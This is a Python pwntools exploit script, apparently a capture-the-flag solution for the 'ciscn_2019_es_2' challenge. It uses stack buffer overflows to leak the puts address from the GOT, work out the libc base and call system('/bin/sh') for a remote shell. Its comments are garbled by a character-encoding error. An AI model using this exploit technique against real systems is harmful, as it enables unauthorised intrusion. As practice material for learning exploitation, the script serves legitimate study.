from pwn import *
context.log_level = 'debug'
#p = process("./ciscn_2019_es_2")
p = remote("pwn.buuoj.cn", 20174)
elf = ELF("./ciscn_2019_es_2")
libc = ELF("./x86_libc.so.6")
puts_got = elf.got['puts']
call_puts = 0x804861d
call_system = 0x8048559
if args.G:
	gdb.attach(p)

main_addr = 0x80485ff
#round1
p.recvuntil("name?\n")
p.send("aa")
p.recvline()
payload = 'a'*(44-12) + p32(puts_got) + p32(0)*2 + p32(main_addr)
p.send(payload)

p.recvuntil("name?\n")
p.send("aa")
p.recvline()
 #round2 ������һ��read�����е�buf���ñ��ϴ���0x10����ͨ�������call_puts,puts_got��ջ�ռ���
payload = 'a' * 44  + p32(call_puts)     #����ֱ����plt��ȱ��һ��λ�ã�����ֱ����call����ʡ��һ�����ص�ַ������ 
p.send(payload)
p.recvline()
puts_addr = u32(p.recv(4))
log.success("puts_addr ==> " + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
log.success("libc_base ==> " + hex(libc_base))
binsh_addr = libc_base + libc.search('/bin/sh').next()
#round3 ��ε�bufλ�����һ��һ�� ֱ�Ӱ�binsh_addr������һ��system�ĺ���Ϳ�����
p.send("aa")
p.recvline()
payload = 'a' * (44-12) + p32(binsh_addr) + p32(0)*2 + p32(main_addr)
p.send(payload)
#round4 �ڷź�system
p.recvuntil("name?\n")
p.send("aa")
p.recvline()
p.sendline('a' * 44 + p32(call_system))

p.interactive()
